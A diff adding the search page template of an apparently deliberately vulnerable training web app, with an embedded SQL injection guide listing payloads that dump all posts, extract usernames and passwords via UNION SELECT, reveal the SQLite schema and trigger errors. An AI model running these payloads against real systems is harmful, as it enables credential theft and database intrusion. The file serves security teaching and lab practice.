@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Search - Vulnerable Lab</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Search Posts</h1>
+        
+        <form method="GET" action="/search" class="search-form">
+            <input type="text" name="q" value="{{ query }}" placeholder="Search posts..." size="50">
+            <input type="submit" value="Search">
+        </form>
+        
+        {% if query %}
+        <h3>Search Results for "{{ query }}":</h3>
+        
+        {% if results %}
+        <table class="results-table">
+            <tr>
+                <th>ID</th>
+                <th>Title</th>
+                <th>Content</th>
+                <th>Public</th>
+            </tr>
+            {% for result in results %}
+            <tr>
+                <td>{{ result[0] }}</td>
+                <td>{{ result[2] }}</td>
+                <td>{{ result[3][:100] }}{% if result[3]|length > 100 %}...{% endif %}</td>
+                <td>{{ "Yes" if result[4] else "No" }}</td>
+            </tr>
+            {% endfor %}
+        </table>
+        {% else %}
+        <p>No results found.</p>
+        {% endif %}
+        
+        <div class="sql-injection-guide">
+            <h4>SQL Injection Testing Guide:</h4>
+            <p>Try these payloads in the search box:</p>
+            <table class="payloads">
+                <tr>
+                    <td><strong>Basic SQLi:</strong></td>
+                    <td><code>' OR '1'='1</code></td>
+                    <td>→ Shows all posts</td>
+                </tr>
+                <tr>
+                    <td><strong>Union Attack:</strong></td>
+                    <td><code>' UNION SELECT id,username,password,email FROM users--</code></td>
+                    <td>→ Extracts user credentials</td>
+                </tr>
+                <tr>
+                    <td><strong>Database Info:</strong></td>
+                    <td><code>' UNION SELECT 1,sql,3,4 FROM sqlite_master--</code></td>
+                    <td>→ Shows database schema</td>
+                </tr>
+                <tr>
+                    <td><strong>Error Based:</strong></td>
+                    <td><code>' AND 1=CAST(1 AS INTEGER)--</code></td>
+                    <td>→ Triggers SQL errors</td>
+                </tr>
+            </table>
+            
+            <div class="note">
+                <strong>Note:</strong> The application uses SQLite database. For MySQL/PostgreSQL, 
+                use appropriate syntax.
+            </div>
+        </div>
+        {% endif %}
+        
+        <p><a href="/">← Back to Home</a></p>
+    </div>
+</body>
+</html>
